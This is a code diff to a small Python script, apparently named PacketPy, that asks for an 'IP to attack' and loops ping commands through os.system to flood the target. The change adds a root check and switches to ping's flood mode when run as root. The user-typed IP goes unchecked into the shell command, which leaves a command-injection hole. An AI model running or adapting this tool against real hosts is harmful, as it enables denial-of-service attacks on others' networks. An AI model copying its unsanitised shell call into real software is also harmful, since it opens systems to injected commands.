@@ -6,15 +6,20 @@ import os
 import time as t
 import random as rand
 
-version = '1.0-05_beta' # Don't touch this
+version = '1.0-06_beta' # Don't touch this
 
 bytessent = 0
 size = 32
+sudo = False
 sent = 0
 
 print("PacketPy " + str(version))
 print("Running in standalone mode")
-
+if os.geteuid() == 0:
+	print("UUID is root, running in optimized mode")
+	sudo = True
+else:
+	print("Please run with root permissions for faster performance!")
 
 ip = input("IP to attack [127.0.0.1]: ")
 attack = 'ping ' + ip + ' -c 1 -q'
@@ -30,7 +35,10 @@ if packets == str(""):
 	packets = 1000
 
 while int(packets) >> 0:
-	attack = 'ping -q -W 0.001 -w 0.001 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
+	if sudo == False:
+		attack = 'ping -q -W 0.001 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
+	if sudo == True:
+		attack = 'ping -f -q -W 0.001 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
 	os.system(attack)
 	bytessent = int(bytessent) + int(size)
 	sent = int(sent) + 1
